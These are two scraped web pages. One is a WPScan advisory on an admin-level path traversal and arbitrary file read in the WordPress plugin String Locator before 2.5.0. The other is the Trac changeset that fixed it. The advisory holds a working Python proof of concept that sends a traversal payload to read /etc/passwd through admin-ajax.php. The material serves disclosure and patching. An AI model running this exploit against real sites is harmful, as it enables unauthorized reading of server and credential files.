=== Content from wpscan.com_4a6d125c_20250114_201155.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# String Locator < 2.5.0 - Admin+ Arbitrary File Read

### Description

The plugin does not properly validate the path of the files to be searched, allowing high privilege users such as admin to query arbitrary files on the web server via a path traversal vector. Furthermore, due to a flaw in the search, allowing a pattern to be provided, which will be used to output the relevant matches from the matching file, all content of the file can be disclosed.

Note: The attack does not work on multisite (as admin), or when FILE\_MODS is disallowed, but works when only FILE\_EDIT is disallowed. Furthermore, admins should be restricted to file inside the blog, not arbitrary ones on the web server.

### Proof of Concept

import requests, re
BASE\_URL = "http://localhost:8000"
id = "wordpress"
pw = "wordpress"
FILENAME = "/etc/passwd"
FIND\_KEYWORD = "/.\*/i"
def filter(text) :
cleanr =re.compile('<.\*?>')
cleantext = re.sub(cleanr, '', text)
cleantext = cleantext.replace("&hellip;", "")
return cleantext
def login(id, pw) :
# Phase : Login (because, we need a nonce value)
sess = requests.Session()
sess.post(
BASE\_URL + "/wp-login.php",
data = {
'log': id,
'pwd': pw,
'wp-submit': '%EB%A1%9C%EA%B7%B8%EC%9D%B8',
'testcookie': '1'
}
).text
return sess
def exploit(sess) :
# Phase : Get nonce value
res = sess.get(f"{BASE\_URL}/wp-admin/tools.php?page=string-locator")
res = res.text
res = res[res.find('search\_nonce"'):][15:]
nonce = res[:res.find('"')]
# Phase : Attack !
res = sess.post(
f"{BASE\_URL}/wp-admin/admin-ajax.php",
headers = {"Content-Type": "application/x-www-form-urlencoded"},
data = {
"action" : "string-locator-get-directory-structure",
"directory" : f"t-../../../../../../../{FILENAME}",
"search" : f"{FIND\_KEYWORD}",
"regex" : "true",
"nonce" : nonce
},
proxies = {"http": "http://localhost:8080"}
)
if res.json()["success"] == True :
res = sess.post(
f"{BASE\_URL}/wp-admin/admin-ajax.php",
headers = {"Content-Type": "application/x-www-form-urlencoded"},
data = {
"action" : "string-locator-search",
"filenum" : "0",
"nonce" : nonce
},
proxies = {"http": "http://localhost:8080"}
)
# print(res.text)
for line in res.json()["data"]["search"][0][1:] :
print(filter(line['stringresult']))
sess = login(id, pw)
exploit(sess)

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

string-locator](https://a8cteam5105.wordpress.com/plugin/string-locator/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.5.0

### References

CVE
[CVE-2022-0493](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0493)

URL
<https://plugins.trac.wordpress.org/changeset/2685592>

### Classification

Type
TRAVERSAL

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-22](https://cwe.mitre.org/data/definitions/22.html)

CVSS
[2.7 (low)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N)

### Miscellaneous

Original Researcher
qerogram

Submitter
qerogram

Submitter website
<https://github.com/qerogram>

Verified
Yes

WPVDB ID
[21e2e5fc-03d2-4791-beef-07af6bf985ed](https://a8cteam5105.wordpress.com/vulnerability/21e2e5fc-03d2-4791-beef-07af6bf985ed/)

### Timeline

Publicly Published
2022-03-01 (about 2 years ago)

Added
2022-03-01 (about 2 years ago)

Last Updated
2022-04-08 (about 2 years ago)

### Other

Published
Title

Published
2022-06-06
Title
[Product Configurator for WooCommerce < 1.2.32 - Unauthenticated Arbitrary File Deletion](https://a8cteam5105.wordpress.com/vulnerability/b66d6682-edbc-435f-a73a-dced32a32770/)

Published
2017-02-15
Title
[Posts In Page < 1.3.0 - Directory Traversal](https://a8cteam5105.wordpress.com/vulnerability/10d8de47-f9fb-4abf-93ab-74f514eb965b/)

Published
2022-09-06
Title
[BackupBuddy < 8.7.5 - Unauthenticated Arbitrary File Access](https://a8cteam5105.wordpress.com/vulnerability/435c9614-638d-439d-8ca2-2653d8628185/)

Published
2020-08-11
Title
[Add From Server <= 3.3.3 - Authenticated Path Traversal to Arbitrary File Access](https://a8cteam5105.wordpress.com/vulnerability/17d1f19b-a550-4eba-94be-942a96a0d6c8/)

Published
2021-02-08
Title
[Digital Publications by Supsystic < 1.6.12 - Authenticated Path Traversal](https://a8cteam5105.wordpress.com/vulnerability/bbd88bd2-b0aa-405f-936d-e19115950bd1/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from plugins.trac.wordpress.org_44b8faa9_20250114_201154.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2685592)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/2685591 "Changeset 2685591")
* [Next Changeset](/changeset/2685593 "Changeset 2685593") →

---

# Changeset 2685592

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
02/27/2022 01:44:33 PM
([3 years](/timeline?from=2022-02-27T13%3A44%3A33Z&precision=second "See timeline at 02/27/2022 01:44:33 PM") ago)

Author:
Clorith
Message:

Version 2.5.0

Location:
[string-locator](/browser/string-locator?rev=2685592)
Files:

38 added
4 edited

* [tags/2.5.0](/browser/string-locator/tags/2.5.0?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/LICENSE](/browser/string-locator/tags/2.5.0/LICENSE?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/build](/browser/string-locator/tags/2.5.0/build?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/build/string-locator-search.asset.php](/browser/string-locator/tags/2.5.0/build/string-locator-search.asset.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/build/string-locator-search.js](/browser/string-locator/tags/2.5.0/build/string-locator-search.js?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/build/string-locator.asset.php](/browser/string-locator/tags/2.5.0/build/string-locator.asset.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/build/string-locator.css](/browser/string-locator/tags/2.5.0/build/string-locator.css?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/build/string-locator.js](/browser/string-locator/tags/2.5.0/build/string-locator.js?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/changelog.txt](/browser/string-locator/tags/2.5.0/changelog.txt?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes](/browser/string-locator/tags/2.5.0/includes?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/REST](/browser/string-locator/tags/2.5.0/includes/REST?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/REST/class-base.php](/browser/string-locator/tags/2.5.0/includes/REST/class-base.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/REST/class-clean.php](/browser/string-locator/tags/2.5.0/includes/REST/class-clean.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/REST/class-directory-structure.php](/browser/string-locator/tags/2.5.0/includes/REST/class-directory-structure.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/REST/class-save.php](/browser/string-locator/tags/2.5.0/includes/REST/class-save.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/REST/class-search.php](/browser/string-locator/tags/2.5.0/includes/REST/class-search.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/Tests](/browser/string-locator/tags/2.5.0/includes/Tests?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/Tests/class-loopback.php](/browser/string-locator/tags/2.5.0/includes/Tests/class-loopback.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/Tests/class-smart-scan.php](/browser/string-locator/tags/2.5.0/includes/Tests/class-smart-scan.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/class-directory-iterator.php](/browser/string-locator/tags/2.5.0/includes/class-directory-iterator.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/class-save.php](/browser/string-locator/tags/2.5.0/includes/class-save.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/class-search.php](/browser/string-locator/tags/2.5.0/includes/class-search.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/includes/class-string-locator.php](/browser/string-locator/tags/2.5.0/includes/class-string-locator.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/readme.txt](/browser/string-locator/tags/2.5.0/readme.txt?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/string-locator.php](/browser/string-locator/tags/2.5.0/string-locator.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/uninstall.php](/browser/string-locator/tags/2.5.0/uninstall.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/views](/browser/string-locator/tags/2.5.0/views?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/views/editor.php](/browser/string-locator/tags/2.5.0/views/editor.php?rev=2685592 "Show entry in browser")
  (added)
* [tags/2.5.0/views/search.php](/browser/string-locator/tags/2.5.0/views/search.php?rev=2685592 "Show entry in browser")
  (added)
* [trunk/build](/browser/string-locator/trunk/build?rev=2685592 "Show entry in browser")
  (added)
* [trunk/build/string-locator-search.asset.php](/browser/string-locator/trunk/build/string-locator-search.asset.php?rev=2685592 "Show entry in browser")
  (added)
* [trunk/build/string-locator-search.js](/browser/string-locator/trunk/build/string-locator-search.js?rev=2685592 "Show entry in browser")
  (added)
* [trunk/build/string-locator.asset.php](/browser/string-locator/trunk/build/string-locator.asset.php?rev=2685592 "Show entry in browser")
  (added)
* [trunk/build/string-locator.css](/browser/string-locator/trunk/build/string-locator.css?rev=2685592 "Show entry in browser")
  (added)
* [trunk/build/string-locator.js](/browser/string-locator/trunk/build/string-locator.js?rev=2685592 "Show entry in browser")
  (added)
* [trunk/changelog.txt](/browser/string-locator/trunk/changelog.txt?rev=2685592 "Show entry in browser")
  (modified)
  ([1 diff](#file35 "Show differences"))
* [trunk/includes/class-string-locator.php](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592 "Show entry in browser")
  (modified)
  ([19 diffs](#file36 "Show differences"))
* [trunk/readme.txt](/browser/string-locator/trunk/readme.txt?rev=2685592 "Show entry in browser")
  (modified)
  ([2 diffs](#file37 "Show differences"))
* [trunk/string-locator.php](/browser/string-locator/trunk/string-locator.php?rev=2685592 "Show entry in browser")
  (modified)
  ([3 diffs](#file38 "Show differences"))
* [trunk/views](/browser/string-locator/trunk/views?rev=2685592 "Show entry in browser")
  (added)
* [trunk/views/editor.php](/browser/string-locator/trunk/views/editor.php?rev=2685592 "Show entry in browser")
  (added)
* [trunk/views/search.php](/browser/string-locator/trunk/views/search.php?rev=2685592 "Show entry in browser")
  (added)

### Legend:

Unmodified
Added
Removed

* ## [string-locator/trunk/changelog.txt](/changeset/2685592/string-locator/trunk/changelog.txt "Show the changeset 2685592 restricted to string-locator/trunk/changelog.txt")

  | [r2432238](/browser/string-locator/trunk/changelog.txt?rev=2432238#L1 "Show revision 2432238 of this file in browser") | [r2685592](/browser/string-locator/trunk/changelog.txt?rev=2685592#L1 "Show revision 2685592 of this file in browser") |  |
  | --- | --- | --- |
  |  | 1 | = 2.4.2 = |
  |  | 2 | \* Fixed the option to restore previous search. |
  |  | 3 | \* Fixed respecting text capitalization in previews when doing a non-regex search. |
  |  | 4 | \* Changed capability checks, now works on hosts that maintain updates for their users. |
  |  | 5 |  |
  | 1 | 6 | = 2.4.1 = |
  | 2 | 7 | \* Fixed case-sensitive class call, apparently not all PHP versions are equal in how this is treated. |
* ## [string-locator/trunk/includes/class-string-locator.php](/changeset/2685592/string-locator/trunk/includes/class-string-locator.php "Show the changeset 2685592 restricted to string-locator/trunk/includes/class-string-locator.php")

  | [r2432238](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L1 "Show revision 2432238 of this file in browser") | [r2685592](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L1 "Show revision 2685592 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | <?php |
  |  | 2 |  |
  |  | 3 | namespace JITS\StringLocator; |
  | 2 | 4 |  |
  | 3 | 5 | /\*\* |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L6) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L8) |  |
  | 6 | 8 | class String\_Locator { |
  | 7 | 9 | /\*\* |
  | 8 |  | \* @var string $string\_locator\_language The code language used for the editing page. |
  | 9 |  | \* @var string $version String Locator version number. |
  | 10 |  | \* @var array $notice An array containing all notices to display. |
  | 11 |  | \* @var bool $failed\_edit Has there been a failed edit. |
  | 12 |  | \* @var string $path\_to\_use The path to the currently editable file. |
  | 13 |  | \* @var array $bad\_http\_codes An array of HTTP status codes that will trigger the rollback feature. |
  | 14 |  | \* @var array $bad\_file\_types An array of file extensions that will be ignored by the scanner. |
  | 15 |  | \* @var int $excerpt\_length The length of the excerpt from the line containing a match. |
  | 16 |  | \* @var int|null $max\_execution\_time The server-configured max time a script can run. |
  | 17 |  | \* @var int $start\_execution\_time The current time when our script started executing. |
  | 18 |  | \* @var int $max\_memory\_consumption The server-configured max amount of memory a script can use. |
  |  | 10 | \* The code language used for the editing page. |
  |  | 11 | \* |
  |  | 12 | \* @var string |
  | 19 | 13 | \*/ |
  | 20 | 14 | public $string\_locator\_language = ''; |
  | 21 |  | public $version                 = '2.4.2'; |
  | 22 |  | public $notice                  = array(); |
  | 23 |  | public $failed\_edit             = false; |
  | 24 |  | private $path\_to\_use            = ''; |
  | 25 |  | private $bad\_http\_codes         = array( '500' ); |
  | 26 |  | private $bad\_file\_types         = array( 'rar', '7z', 'zip', 'tar', 'gz', 'jpg', 'jpeg', 'png', 'gif', 'mp3', 'mp4', 'avi', 'wmv' ); |
  | 27 |  | private $excerpt\_length         = 25; |
  | 28 |  | private $max\_execution\_time     = null; |
  | 29 |  | private $start\_execution\_timer  = 0; |
  | 30 |  | private $max\_memory\_consumption = 0; |
  | 31 |  |  |
  | 32 |  | private $rest\_namespace = 'string-locator'; |
  |  | 15 |  |
  |  | 16 | /\*\* |
  |  | 17 | \* An array containing all notices to display. |
  |  | 18 | \* |
  |  | 19 | \* @var array |
  |  | 20 | \*/ |
  |  | 21 | public $notice = array(); |
  | 33 | 22 |  |
  | 34 | 23 | /\*\* |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L48) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L37) |  |
  | 48 | 37 | \*/ |
  | 49 | 38 | public function init() { |
  | 50 |  | ~~/\*\*~~ |
  | 51 |  | ~~\* Define class variables requiring expressions~~ |
  | 52 |  | ~~\*/~~ |
  | 53 |  | ~~$this->path\_to\_use    = ( is\_multisite() ? 'network/admin.php' : 'tools.php' );~~ |
  | 54 |  | ~~$this->excerpt\_length = apply\_filters( 'string\_locator\_excerpt\_length', 25 );~~ |
  | 55 |  |  |
  | 56 |  | ~~$this->max\_execution\_time    = absint( ini\_get( 'max\_execution\_time' ) );~~ |
  | 57 |  | ~~$this->start\_execution\_timer = microtime( true );~~ |
  | 58 |  |  |
  | 59 |  | ~~if ( $this->max\_execution\_time > 30 ) {~~ |
  | 60 |  | ~~$this->max\_execution\_time = 30;~~ |
  | 61 |  | ~~}~~ |
  | 62 |  |  |
  | 63 |  | ~~$this->set\_memory\_limit();~~ |
  | 64 |  |  |
  | 65 | 39 | add\_filter( 'admin\_body\_class', array( $this, 'admin\_body\_class' ) ); |
  | 66 | 40 |  |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L72) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L46) |  |
  | 72 | 46 | add\_action( 'plugins\_loaded', array( $this, 'load\_i18n' ) ); |
  | 73 | 47 |  |
  | 74 |  | ~~add\_action( 'wp\_ajax\_string-locator-get-directory-structure', array( $this, 'ajax\_get\_directory\_structure' ) );~~ |
  | 75 |  | ~~add\_action( 'wp\_ajax\_string-locator-search', array( $this, 'ajax\_file\_search' ) );~~ |
  | 76 |  | ~~add\_action( 'wp\_ajax\_string-locator-clean', array( $this, 'ajax\_clean\_search' ) );~~ |
  | 77 |  |  |
  | 78 | 48 | add\_filter( 'plugin\_row\_meta', array( $this, 'plugin\_row\_meta' ), 10, 2 ); |
  | 79 | 49 |  |
  | 80 |  | add\_action( 'rest\_api\_init', array( $this, 'add\_rest\_route' ) ); |
  | 81 |  | } |
  | 82 |  |  |
  | 83 |  | public function add\_rest\_route() { |
  | 84 |  | register\_rest\_route( |
  | 85 |  | sprintf( |
  | 86 |  | '%s/v1', |
  | 87 |  | $this->rest\_namespace |
  | 88 |  | ), |
  | 89 |  | '/save', |
  | 90 |  | array( |
  | 91 |  | 'methods'             => 'POST', |
  | 92 |  | 'callback'            => array( $this, 'editor\_save' ), |
  | 93 |  | 'permission\_callback' => function() { |
  | 94 |  | return current\_user\_can( 'edit\_themes' ); |
  | 95 |  | }, |
  | 96 |  | ) |
  | 97 |  | ); |
  | 98 |  | } |
  | 99 |  |  |
  | 100 |  | /\*\* |
  | 101 |  | \* Sets up the memory limit variables. |
  | 102 |  | \* |
  | 103 |  | \* @since 2.0.0 |
  | 104 |  | \* |
  | 105 |  | \* @return void |
  | 106 |  | \*/ |
  | 107 |  | function set\_memory\_limit() { |
  | 108 |  | $memory\_limit = ini\_get( 'memory\_limit' ); |
  | 109 |  |  |
  | 110 |  | $this->max\_memory\_consumption = absint( $memory\_limit ); |
  | 111 |  |  |
  | 112 |  | if ( strstr( $memory\_limit, 'k' ) ) { |
  | 113 |  | $this->max\_memory\_consumption = ( str\_replace( 'k', '', $memory\_limit ) \* 1000 ); |
  | 114 |  | } |
  | 115 |  | if ( strstr( $memory\_limit, 'M' ) ) { |
  | 116 |  | $this->max\_memory\_consumption = ( str\_replace( 'M', '', $memory\_limit ) \* 1000000 ); |
  | 117 |  | } |
  | 118 |  | if ( strstr( $memory\_limit, 'G' ) ) { |
  | 119 |  | $this->max\_memory\_consumption = ( str\_replace( 'G', '', $memory\_limit ) \* 1000000000 ); |
  | 120 |  | } |
  |  | 50 | add\_filter( 'string\_locator\_search\_sources\_markup', array( $this, 'add\_search\_options' ), 10, 2 ); |
  |  | 51 | add\_action( 'wp\_ajax\_string\_locator\_notice\_dismiss', array( $this, 'dismiss\_notice' ) ); |
  |  | 52 |  |
  |  | 53 | add\_action( 'admin\_notices', array( $this, 'show\_sponsorship\_notice' ) ); |
  |  | 54 | } |
  |  | 55 |  |
  |  | 56 | public function dismiss\_notice() { |
  |  | 57 | // Only users who can use the plugin should be able to dismiss the notice. |
  |  | 58 | if ( ! current\_user\_can( 'update\_core' ) || ! wp\_verify\_nonce( $\_POST['\_nonce'], 'string-locator-notice-dismiss' ) ) { |
  |  | 59 | return; |
  |  | 60 | } |
  |  | 61 |  |
  |  | 62 | update\_option( 'string-locator-sponsorship-notice-dismissed', array( 'is\_dismissed' => true ) ); |
  |  | 63 | } |
  |  | 64 |  |
  |  | 65 | public function show\_sponsorship\_notice() { |
  |  | 66 | $screen = get\_current\_screen(); |
  |  | 67 |  |
  |  | 68 | // Only show the notice on the plugins search page. |
  |  | 69 | if ( 'tools\_page\_string-locator' !== $screen->id || isset( $\_GET['edit-file'] ) ) { |
  |  | 70 | return; |
  |  | 71 | } |
  |  | 72 |  |
  |  | 73 | // Do not show the notice to users who have dismissed it. |
  |  | 74 | $option = get\_option( 'string-locator-sponsorship-notice-dismissed', array( 'is\_dismissed' => false ) ); |
  |  | 75 | if ( true === $option['is\_dismissed'] ) { |
  |  | 76 | return; |
  |  | 77 | } |
  |  | 78 |  |
  |  | 79 | ?> |
  |  | 80 |  |
  |  | 81 | <div class="notice notice-info is-dismissible" id="string-locator-sponsorship-notice"> |
  |  | 82 | <p> |
  |  | 83 | <?php esc\_html\_e( 'Thank you for trying out the String Locator plugin!', 'string-locator' ); ?> |
  |  | 84 | </p> |
  |  | 85 |  |
  |  | 86 | <p> |
  |  | 87 | <?php esc\_html\_e( 'If you like the plugin, please consider making a donation to support the plugin development.', 'string-locator' ); ?> |
  |  | 88 | </p> |
  |  | 89 |  |
  |  | 90 | <p> |
  |  | 91 | <a href="https://github.com/sponsors/Clorith/" target="\_blank" class="button button-primary"> |
  |  | 92 | <?php esc\_html\_e( 'Donate via GitHub', 'string-locator' ); ?> |
  |  | 93 | </a> |
  |  | 94 |  |
  |  | 95 | <a href="https://paypal.me/clorith" target="\_blank" class="button"> |
  |  | 96 | <?php esc\_html\_e( 'Donate via PayPal', 'string-locator' ); ?> |
  |  | 97 | </a> |
  |  | 98 | </p> |
  |  | 99 |  |
  |  | 100 | <script> |
  |  | 101 | jQuery( document ).ready( function( $ ) { |
  |  | 102 | $( '#string-locator-sponsorship-notice' ).on( 'click', '.notice-dismiss', function() { |
  |  | 103 | $.post( ajaxurl, { |
  |  | 104 | action: 'string\_locator\_notice\_dismiss', |
  |  | 105 | \_nonce: '<?php echo wp\_create\_nonce( 'string-locator-notice-dismiss' ); ?>' |
  |  | 106 | } ); |
  |  | 107 | } ); |
  |  | 108 | } ); |
  |  | 109 | </script> |
  |  | 110 | </div> |
  |  | 111 |  |
  |  | 112 | <?php |
  |  | 113 | } |
  |  | 114 |  |
  |  | 115 | public function add\_search\_options( $searchers, $search\_location ) { |
  |  | 116 | ob\_start(); |
  |  | 117 | ?> |
  |  | 118 | <optgroup label="<?php esc\_attr\_e( 'Core', 'string-locator' ); ?>"> |
  |  | 119 | <option value="core"><?php esc\_html\_e( 'The whole WordPress directory', 'string-locator' ); ?></option> |
  |  | 120 | <option value="wp-content"><?php esc\_html\_e( 'Everything under wp-content', 'string-locator' ); ?></option> |
  |  | 121 | </optgroup> |
  |  | 122 | <optgroup label="<?php esc\_attr\_e( 'Themes', 'string-locator' ); ?>"> |
  |  | 123 | <?php echo String\_Locator::get\_themes\_options( $search\_location ); ?> |
  |  | 124 | </optgroup> |
  |  | 125 | <?php if ( String\_Locator::has\_mu\_plugins() ) : ?> |
  |  | 126 | <optgroup label="<?php esc\_attr\_e( 'Must Use Plugins', 'string-locator' ); ?>"> |
  |  | 127 | <?php echo String\_Locator::get\_mu\_plugins\_options( $search\_location ); ?> |
  |  | 128 | </optgroup> |
  |  | 129 | <?php endif; ?> |
  |  | 130 | <optgroup label="<?php esc\_attr\_e( 'Plugins', 'string-locator' ); ?>"> |
  |  | 131 | <?php echo String\_Locator::get\_plugins\_options( $search\_location ); ?> |
  |  | 132 | </optgroup> |
  |  | 133 | <?php |
  |  | 134 |  |
  |  | 135 | $searchers .= ob\_get\_clean(); |
  |  | 136 |  |
  |  | 137 | return $searchers; |
  | 121 | 138 | } |
  | 122 | 139 |  |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L132) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L149) |  |
  | 132 | 149 | if ( 'string-locator/string-locator.php' === $plugin\_file ) { |
  | 133 | 150 | $meta[] = sprintf( |
  | 134 |  | '<a href="https://~~www.paypal.me/clorith~~">%s</a>', |
  |  | 151 | '<a href="https://github.com/sponsors/Clorith/">%s</a>', |
  | 135 | 152 | esc\_html\_\_( 'Donate to this plugin', 'string-locator' ) |
  | 136 | 153 | ); |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L193) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L210) |  |
  | 193 | 210 | ); |
  | 194 | 211 |  |
  |  | 212 | $fields = apply\_filters( 'string\_locator\_editor\_fields', $fields ); |
  |  | 213 |  |
  | 195 | 214 | $field\_output = array(); |
  | 196 | 215 |  |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L287) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L306) |  |
  | 287 | 306 |  |
  | 288 | 307 | return false; |
  | 289 |  | ~~}~~ |
  | 290 |  |  |
  | 291 |  | ~~/\*\*~~ |
  | 292 |  | ~~\* Handles the AJAX request to prepare the search hierarchy.~~ |
  | 293 |  | ~~\*~~ |
  | 294 |  | ~~\* @return void~~ |
  | 295 |  | ~~\*/~~ |
  | 296 |  | ~~function ajax\_get\_directory\_structure() {~~ |
  | 297 |  | ~~if ( ! check\_ajax\_referer( 'string-locator-search', 'nonce', false ) ) {~~ |
  | 298 |  | ~~wp\_send\_json\_error( \_\_( 'Authentication failed', 'string-locator' ) );~~ |
  | 299 |  | ~~}~~ |
  | 300 |  |  |
  | 301 |  | ~~$scan\_path = $this->prepare\_scan\_path( $\_POST['directory'] );~~ |
  | 302 |  | ~~if ( is\_file( $scan\_path->path ) ) {~~ |
  | 303 |  | ~~$files = array( $scan\_path->path );~~ |
  | 304 |  | ~~} else {~~ |
